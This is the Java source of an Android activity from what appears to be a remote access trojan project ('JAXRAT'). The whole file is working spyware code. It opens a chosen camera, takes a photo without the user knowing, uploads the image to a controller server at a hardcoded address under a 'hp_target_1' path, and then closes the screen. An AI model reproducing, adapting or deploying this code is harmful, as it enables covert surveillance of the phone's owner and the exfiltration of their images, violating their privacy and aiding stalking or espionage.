package com.ezax.agent;

import android.Manifest;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;

public class CameraActivity extends AppCompatActivity {
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private String cameraId;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.camera_layout);

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            finish(); return;
        }

        boolean isFront = getIntent().getBooleanExtra("FRONT", false);
        startBackgroundThread();
        setupCamera(isFront);
    }

    private void setupCamera(boolean isFront) {
        CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
        try {
            for (String id : manager.getCameraIdList()) {
                CameraCharacteristics chars = manager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (isFront && facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    cameraId = id; break;
                } else if (!isFront && facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id; break;
                }
            }
            
            if (cameraId != null) {
                imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
                imageReader.setOnImageAvailableListener(reader -> {
                    Image image = reader.acquireLatestImage();
                    if (image != null) {
                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buffer.remaining()];
                        buffer.get(bytes);
                        uploadImage(bytes);
                        image.close();
                    }
                }, backgroundHandler);

                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                    manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                        @Override
                        public void onOpened(CameraDevice camera) {
                            cameraDevice = camera;
                            takePicture();
                        }
                        @Override public void onDisconnected(CameraDevice camera) { camera.close(); }
                        @Override public void onError(CameraDevice camera, int error) { camera.close(); }
                    }, backgroundHandler);
                }
            }
        } catch (Exception e) { Log.e("JAXRAT", "Camera Error", e); finish(); }
    }

    private void takePicture() {
        try {
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            builder.addTarget(imageReader.getSurface());
            cameraDevice.createCaptureSession(java.util.Collections.singletonList(imageReader.getSurface()), 
                new CameraCaptureSession.StateCallback() {
                    @Override
                    public void onConfigured(CameraCaptureSession session) {
                        captureSession = session;
                        try { session.capture(builder.build(), null, backgroundHandler); } 
                        catch (Exception e) { }
                    }
                    @Override public void onConfigureFailed(CameraCaptureSession session) { }
                }, backgroundHandler);
        } catch (Exception e) { }
    }

    private void uploadImage(byte[] imageBytes) {
        new Thread(() -> {
            try {
                // IP DISESUAIKAN DENGAN LAPTOP KAMU
                String serverUrl = "http://192.168.1.12:5000/api/upload_image/hp_target_1"; 
                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                String boundary = "***";
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream request = new DataOutputStream(conn.getOutputStream());
                request.writeBytes("--" + boundary + "\r\n");
                request.writeBytes("Content-Disposition: form-data; name=\"image\";filename=\"image.jpg\"\r\n\r\n");
                request.write(imageBytes);
                request.writeBytes("\r\n--" + boundary + "--\r\n");
                request.flush(); request.close();

                int responseCode = conn.getResponseCode();
                Log.d("JAXRAT", "Upload Foto Selesai: " + responseCode);
            } catch (Exception e) { Log.e("JAXRAT", "Upload Error", e); }
            
            runOnUiThread(this::finish); // Tutup layar kamera setelah upload
        }).start();
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (cameraDevice != null) cameraDevice.close();
        if (imageReader != null) imageReader.close();
        if (backgroundThread != null) backgroundThread.quitSafely();
    }
}
